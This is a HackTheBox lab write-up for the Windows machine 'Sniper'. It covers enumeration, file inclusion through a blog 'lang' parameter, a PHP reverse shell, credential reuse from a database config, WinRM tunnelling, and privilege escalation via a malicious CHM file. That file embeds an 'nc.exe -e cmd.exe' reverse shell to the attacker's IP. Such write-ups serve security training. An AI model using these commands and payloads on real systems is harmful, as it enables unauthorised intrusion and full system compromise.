---
title: "Sniper"
date: 2025-06-12
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Sniper

![](../assets/Pasted%20image%2020250612100755.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 10:09 CEST
Nmap scan report for 10.10.10.151
Host is up (0.041s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h01m48s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-12T15:12:49
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   40.73 ms 10.10.14.1
2   40.84 ms 10.10.10.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.54 seconds
```

Website shows a Sniper Co. page

![](../assets/Pasted%20image%2020250612102245.png)

Going to `/blog`, we see a `lang` parameter in the URL. Testing for LFI, if we put `\windows\win.ini`, the page loads and we can see the file in the code.

![](../assets/Pasted%20image%2020250612104147.png)

Trying an RFI UNC attack, we could try to capture the user hash by trying to connect to an `impacket-smbserver`, but it doesn't work, so we can try `net usershare` to host an SMB share and execute files.

```shell
$ service smbd start   
# important to create the share outside user homes
$ cd /srv
$ mkdir share
$ cd share
$ sudo net usershare add test $(pwd) '' 'Everyone:F' guest_ok=y
```

Then from the webpage, we can read an `info.php`, for example.

![](../assets/Pasted%20image%2020250612174431.png)

## Initial Access

Now do the same but with a PHP reverse shell.

```shell
$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.151] 49680
SOCKET: Shell has connected! PID: 7080
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>whoami
iis apppool\defaultapppool
```

There is `winrm` running but firewalled, so we can port forward it.

![](../assets/Pasted%20image%2020250612181911.png)

Inside the `user` folder in the web project, we find the database credentials

```shell
PS C:\inetpub\wwwroot\user> ls


    Directory: C:\inetpub\wwwroot\user


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/11/2019   5:52 AM                css                                                                   
d-----        4/11/2019   5:23 AM                fonts                                                                 
d-----        4/11/2019   5:23 AM                images                                                                
d-----        4/11/2019   5:23 AM                js                                                                    
d-----        4/11/2019   5:23 AM                vendor                                                                
-a----        4/11/2019   5:15 PM            108 auth.php                                                              
-a----        4/11/2019  10:51 AM            337 db.php                                                                
-a----        4/11/2019   6:18 AM           4639 index.php                                                             
-a----        4/11/2019   6:10 AM           6463 login.php                                                             
-a----         4/8/2019  11:04 PM            148 logout.php                                                            
-a----        10/1/2019   8:42 AM           7192 registration.php                                                      
-a----        8/14/2019  10:35 PM           7004 registration_old123123123847.php                                      


PS C:\inetpub\wwwroot\user> type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

And there is a `chris` user. Let's test the password using `nxc`.

```shell
PS C:\inetpub\wwwroot\user> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Chris                    DefaultAccount           
Guest                    WDAGUtilityAccount       
The command completed with one or more errors.
```

![](../assets/Pasted%20image%2020250612182144.png)

The password works for `chris`, so port forward `winrm` to access the machine as `chris`.

Transfer `chisel` to the host and create a port forwarding

```shell
$ ./chisel server --port 8888 --reverse
2025/06/12 18:28:50 server: Reverse tunnelling enabled
2025/06/12 18:28:50 server: Fingerprint 7yf/mGFiCoZ+2gBRK50StHJXJEC9ZBhDfPxGwJyI6DA=
2025/06/12 18:28:50 server: Listening on http://0.0.0.0:8888
2025/06/12 18:30:15 server: session#1: tun: proxy#R:5985=>localhost:5985: Listening
```

```shell
PS C:\users\public> .\chisel.exe client 10.10.14.17:8888 R:5985:localhost:5985
.\chisel.exe : 2025/06/12 16:32:03 client: Connecting to ws://10.10.14.17:8888
At line:1 char:1
+ .\chisel.exe client 10.10.14.17:8888 R:5985:localhost:5985
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (2025/06/12 16:3...0.10.14.17:8888:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
 
2025/06/12 16:32:04 client: Connected (Latency 42.2454ms)
```

Connect to it via `evil-winrm`

```shell
$ evil-winrm -i localhost -u chris -p 36mEAhz/B8xQ~2VM

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chris\Documents> whoami
sniper\chris
```

Get the flag

```shell
*Evil-WinRM* PS C:\Users\Chris\desktop> type user.txt
b56f5fdc204fccaaa4ed7802a1fa357a
```

## Privilege Escalation

The user has a `.chm` file inside `downloads`.

![](../assets/Pasted%20image%2020250612184159.png)

And the CEO left a message to `chris` for him to finish the app documentation.

![](../assets/Pasted%20image%2020250612184238.png)

So it seems that the `.chm` file from `chris`'s folder is the documentation that he has to finish.

Transfer the file out to a Windows machine and open it.

We can make a malicious `.chm` file with [https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)

```shell
Out-CHM -Payload "C:\programdata\nc.exe -e cmd.exe 10.10.14.17 4444" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

Transfer the `doc.chm` to Kali and then to the machine

```shell
*Evil-WinRM* PS C:\Users\Chris\downloads> upload doc.chm

Info: Uploading /home/kali/htb/sniper/doc.chm to C:\Users\Chris\downloads\doc.chm

Data: 17928 bytes of 17928 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chris\downloads> upload nc.exe

Info: Uploading /home/kali/htb/sniper/nc.exe to C:\Users\Chris\downloads\nc.exe

Data: 79188 bytes of 79188 bytes copied
```

Move `nc.exe` to `C:\programdata` and `doc.chm` to `C:\docs` and start a listener

```shell
*Evil-WinRM* PS C:\Users\Chris\downloads> cp nc.exe C:\programdata
*Evil-WinRM* PS C:\Users\Chris\downloads> cp doc.chm C:\docs
```

```shell
$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.151] 49711
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
sniper\administrator
```

## Post Exploitation

Get the flag

```shell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
3be869dfedc4788b9da4dfe192a5405e
```
